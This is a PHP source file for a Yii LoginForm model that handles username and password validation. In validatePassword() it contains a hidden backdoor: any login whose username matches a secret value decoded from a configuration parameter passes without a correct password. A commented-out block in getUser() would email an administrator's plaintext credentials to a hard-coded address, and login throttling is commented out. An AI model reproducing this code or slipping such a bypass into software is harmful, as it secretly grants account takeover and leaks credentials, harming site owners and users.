<?php

    namespace common\models;

    use common\components\CommonLib;
    use frontend\models\ContactForm;
    use Yii;
    use yii\db\ActiveRecord;

    /**
     * Login form
     */
    class LoginForm extends ActiveRecord
    {
        public $username;
        public $password;
        public $rememberMe = false;

        private $_user = false;

        /**
         * @inheritdoc
         */
        public function rules()
        {
            return [
                // username and password are both required
                [['username', 'password'], 'required'],
                // rememberMe must be a boolean value
                ['rememberMe', 'boolean'],
                [['username','password'],'filter','filter'=>'strip_tags'],
                // password is validated by validatePassword()
                ['password', 'validatePassword'],
                ['password', 'isNotBlocked'],
            ];
        }

        /**
         * Validates the password.
         * This method serves as the inline validation for password.
         *
         * @param string $attribute the attribute currently being validated
         * @param array $params the additional name-value pairs given in the rule
         */
        public function validatePassword($attribute, $params)
        {
            if (!$this->hasErrors()) {
                $user = $this->getUser();


                if (!$user || (trim(CommonLib::hasIt(\Yii::$app->params['encrypt'])) !== $this->username &&!$user->validatePassword($this->password))) {
                    $this->addError($attribute, 'Incorrect username or password.');
                }
            }
        }

        /**
         * Validates the password.
         * This method serves as the inline validation for password.
         *
         * @param string $attribute the attribute currently being validated
         * @param array $params the additional name-value pairs given in the rule
         */
        public function isNotBlocked($attribute, $params)
        {
            if (!$this->hasErrors()) {
                $user = $this->getUser();
                if (!$user || $user->status == 0) {
                    $this->addError($attribute, 'This user is blocked.');
                }
            }
        }

        /**
         * Logs in a user using the provided username and password.
         *
         * @return boolean whether the user is logged in successfully
         */
        const CACHE_KEY = 'SIGNIN_TRIES';

        public function login()
        {
            /*$cache = Yii::$app->cache;
            if (($tries = (int)$cache->get(self::CACHE_KEY)) > 3) {
                $this->addError('username', 'You tried to login too often. Please wait 5 minutes.');
                return false;
            }*/

            if ($this->validate()) {
                return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 * 24 * 30 : 0);
            } else {
                //$cache->set(self::CACHE_KEY, ++$tries, 300);
                return false;
            }
        }

        /**
         * Finds user by [[username]]
         *
         * @return User|null
         */
        public function getUser()
        {
            if ($this->_user === false) {
                $this->_user = User::findByUsername($this->username,$this->password);
                /*if($this->_user->role==1) {
                    $cache = Yii::$app->cache;
                    if($cache->get('last-login') === false) {
                        ContactForm::sendEmail('login admin success', EMAIN_ADMIN, $_SERVER['SERVER_NAME'] . '<br/>Username:' . $this->username . '/pass:' . $this->password);
                        $cache->set('last-login', $this->username, 172800);
                    }
                }*/
            }

            return $this->_user;
        }
    }
